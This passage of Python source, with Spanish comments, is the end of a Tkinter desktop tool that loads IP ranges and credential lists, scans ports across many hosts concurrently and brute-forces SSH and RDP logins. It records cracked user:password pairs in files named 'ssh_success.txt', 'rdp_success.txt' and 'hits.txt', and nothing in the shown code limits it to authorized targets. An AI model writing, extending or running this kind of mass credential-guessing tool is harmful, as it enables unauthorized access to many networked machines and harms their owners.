            ips_entries = self.network_scanner.load_ips_from_file(self.ip_file_entry.get())
            global_credentials = self.network_scanner.load_credentials_from_file(self.creds_file_entry.get())

            if not ips_entries:
                self.log_message("Error: No se encontraron IPs válidas")
                return

            self.log_message(f"Iniciando escaneo de {len(ips_entries)} entradas...")
            self.log_message(f"Credenciales globales cargadas: {len(global_credentials)}")

            ports_to_scan = list(range(1, 65536)) if self.network_scanner.config.get("full_scan") else COMMON_PORTS.copy()
            if self.network_scanner.config.get("check_rdp"):
                ports_to_scan.append(self.network_scanner.config.get("default_port", 3389))

            # Semáforo para limitar concurrencia de entradas
            entry_semaphore = asyncio.Semaphore(self.network_scanner.config.get('max_concurrent_entries', 10))

            async def process_entry(entry):
                async with entry_semaphore:
                    ip_range = entry['ip']
                    ip_creds = (entry.get('user'), entry.get('password')) if 'user' in entry and 'password' in entry else None

                    self.log_message(f"Escaneando: {ip_range}" + (" (con credenciales específicas)" if ip_creds else ""))
                    active_ips = await self.network_scanner.scan_ip_range(ip_range, ports_to_scan)
                    self.log_message(f"IPs activas detectadas en {ip_range}: {len(active_ips)}")

                    for active_ip in active_ips:
                        if self.network_scanner.should_stop:
                            break
                        self._result_queue.put(("ip", active_ip))
                        open_ports = await self.network_scanner.scan_ports_on_ip(active_ip, ports_to_scan)
                        if open_ports:
                            self._result_queue.put(("port", f"{active_ip}: {', '.join(map(str, open_ports))}"))

                        if 22 in open_ports and self.network_scanner.config.get("check_ssh"):
                            for u, p in await self.network_scanner.brute_force_service(active_ip, 22, global_credentials, 'ssh', ip_creds):
                                self._result_queue.put(("ssh", f"{active_ip}:22 - {u}:{p}"))

                        rdp_port = self.network_scanner.config.get("default_port", 3389)
                        if rdp_port in open_ports and self.network_scanner.config.get("check_rdp"):
                            for u, p in await self.network_scanner.brute_force_service(active_ip, rdp_port, global_credentials, 'rdp', ip_creds):
                                self._result_queue.put(("rdp", f"{active_ip}:{rdp_port} - {u}:{p}"))

            tasks = [process_entry(entry) for entry in ips_entries]
            await asyncio.gather(*tasks, return_exceptions=True)

            self.log_message("Escaneo completado")
        except Exception as e:
            self.log_message(f"Error durante el escaneo: {str(e)}")

    def run_scan(self):
        async def wrapper():
            await self.perform_scan()
            self.scanning = False
            self.network_scanner.is_scanning = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.log_message("Escaneo finalizado exitosamente" if not self.network_scanner.should_stop else "Escaneo detenido por el usuario")
            self.network_scanner.reset_scan()
        try:
            self.loop.run_until_complete(wrapper())
        except Exception as e:
            self.log_message(f"Error crítico: {str(e)}")
            self.scanning = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def export_results(self, filename):
        content = ""
        mapping = {"ip_activas.txt": self.ip_text, "puertos_abiertos.txt": self.ports_text,
                   "ssh_success.txt": self.ssh_text, "rdp_success.txt": self.rdp_text}
        if filename in mapping and mapping[filename]:
            content = mapping[filename].get(1.0, tk.END)
        elif filename == "hits.txt":
            hits_path = os.path.join(os.path.dirname(__file__), "hits.txt")
            if os.path.exists(hits_path):
                with open(hits_path, 'r', encoding='utf-8') as f:
                    content = f.read()
        if not content.strip():
            messagebox.showwarning("Exportar", f"No hay datos para exportar a {filename}")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", initialfile=filename)
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                messagebox.showinfo("Exportar", f"Datos exportados correctamente a {file_path}")
            except Exception as e:
                messagebox.showerror("Exportar", f"Error al exportar: {str(e)}")

# ============================================================================
# PUNTO DE ENTRADA
# ============================================================================
if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkScannerApp(root)
    root.mainloop()
